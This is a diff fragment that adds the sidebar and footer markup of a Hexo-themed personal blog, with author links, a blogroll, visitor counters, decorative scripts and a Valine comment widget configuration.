+  <div class="site-description" itemprop="description">这个人很懒，什么也没留下</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/jlkl" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;jlkl" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:str3am@qq.com" title="E-Mail → mailto:str3am@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Friends
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://0xmj.github.io/" title="http:&#x2F;&#x2F;0xmj.github.io&#x2F;" rel="noopener" target="_blank">Mang0</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/sn1per/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;sn1per&#x2F;" rel="noopener" target="_blank">Sn1per</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Str3am</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="Symbols count total">218k</span>
+</div> 
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment-precise-range-plugin@1.3.0/moment-precise-range.min.js"></script>
+<script>
+  function timer() {
+    var ages = moment.preciseDiff(moment(),moment(20200108,"YYYYMMDD"));
+    ages = ages.replace(/years?/, "年");
+    ages = ages.replace(/months?/, "月");
+    ages = ages.replace(/days?/, "天");
+    ages = ages.replace(/hours?/, "小时");
+    ages = ages.replace(/minutes?/, "分");
+    ages = ages.replace(/seconds?/, "秒");
+    ages = ages.replace(/\d+/g, '<span style="color:#1890ff">$&</span>');
+    div.innerHTML = `我已在此等候你 ${ages}`;
+  }
+  var div = document.createElement("div");
+  //插入到copyright之后
+  var copyright = document.querySelector(".copyright");
+  document.querySelector(".footer-inner").insertBefore(div, copyright.nextSibling);
+  timer();
+  setInterval("timer()",1000)
+</script>
+
+
+
+
+  <script async src="/js/cursor/love.min.js"></script>
+
+
+
+
+  <script src="/js/cursor/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-user"></i>
+        </span>
+        <span class="site-uv" title="我的第  undefined  位朋友，">
+          <span id="busuanzi_value_site_uv"></span>
+        </span>
+      -->
+      <span class="site-uv">
+     我的第  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_uv"></span>  位朋友，
+    </span>
+    <!--
+      <span class="post-meta-divider">|</span>
+    -->
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-eye"></i>
+        </span>
+        <span class="site-pv" title="历经  undefined  次回眸才与你相遇">
+          <span id="busuanzi_value_site_pv"></span>
+        </span>
+      -->
+      <span class="site-pv">
+     历经  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_pv"></span>  次回眸才与你相遇
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el: '#valine-comments',
+      verify: true,
+      notify: true,
+      appId: '3IVY8n0VhhMlAUHBsp34Pxx7-gzGzoHsz',
+      appKey: 'DjdjX2sAzBG2G1G5c6amlBnv',
+      placeholder: "Just go go",
+      avatar: 'mm',
+      meta: guest,
+      pageSize: '10' || 10,
+      visitor: false,
+      lang: 'en' || 'zh-cn',
+      path: location.pathname,
+      recordIP: true,
+      serverURLs: ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
